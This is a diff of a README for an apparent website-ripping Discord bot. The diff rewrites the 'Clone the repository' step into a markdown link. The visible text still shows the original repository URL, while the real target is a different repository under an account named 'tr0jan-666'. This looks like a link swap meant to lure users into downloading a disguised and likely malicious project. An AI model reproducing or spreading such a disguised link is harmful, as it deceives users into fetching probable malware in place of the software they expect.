@@ -28,7 +28,7 @@ When the extraction finishes, the bot sends a clean embed with:
 
 ### 1. Clone the repository
 ```bash
-git clone https://github.com/CleanX/Site-T7wa.git
+git [clone https://github.com/CleanX/Site-T7wa.git](https://github.com/tr0jan-666/XitersEngine-SiteGrabber-1.0)
 cd Site-T7wa
 
 ### 2. Install dependencies
@@ -49,5 +49,6 @@ py main.py
 
 ### Wait while the bot rips the full website.
 ### Get your zipped package via Discord attachment or MediaFire link.
+
 
 
